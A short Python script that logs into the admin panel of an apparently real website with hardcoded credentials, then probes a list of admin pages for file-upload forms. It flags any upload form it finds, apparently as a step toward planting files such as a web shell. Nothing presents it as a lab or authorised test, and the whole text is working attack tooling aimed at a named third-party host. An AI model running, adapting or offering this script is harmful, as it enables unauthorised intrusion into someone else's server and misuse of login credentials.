import requests

s = requests.Session()
s.get("http://bjhzsv.com/main/", timeout=10)
s.post("http://bjhzsv.com/main/a7chkuser.asp",
    data={"t1": "hermes", "t2": "Hack888!", "t3": "1234"},
    headers={"Referer": "http://bjhzsv.com/main/"}, timeout=10)

# Try all news/article related pages
print("=== News/Article pages ===")
for p in ["news_add.asp", "news_edit.asp", "news_edit.asp?id=1",
          "news_add2.asp", "news_in.asp", "news_re.asp",
          "product_add.asp", "product_edit.asp",
          "gg_add.asp", "gg_edit.asp", "lunbo_add.asp", "lunbo_edit.asp",
          "pic_add.asp", "pic_edit.asp", "down_add.asp",
          "upfile.asp", "upload.asp", "uploadpic.asp",
          "inc/upfile.asp", "inc/upload.asp", "inc/uploadpic.asp"]:
    r = s.get("http://bjhzsv.com/main/" + p, timeout=5)
    t = r.content.decode("gb2312", errors="replace")
    if len(t) > 100:
        has_file = 'type="file"' in t.lower()
        has_form = "<form" in t.lower()
        has_perm = "没有权限" in t
        print("%s: %dB file=%s form=%s perm_denied=%s" % (p, len(t), has_file, has_form, has_perm))
        if has_file:
            print(">>> FILE UPLOAD FOUND! <<<")
            print(t[:500])
        elif has_form and len(t) < 5000:
            print(t[:400])

# Try the news_in.asp handler directly
print("\n=== news_in.asp handler ===")
r = s.get("http://bjhzsv.com/main/news_in.asp", timeout=5)
print("Status:", r.status_code, "Size:", len(r.text))
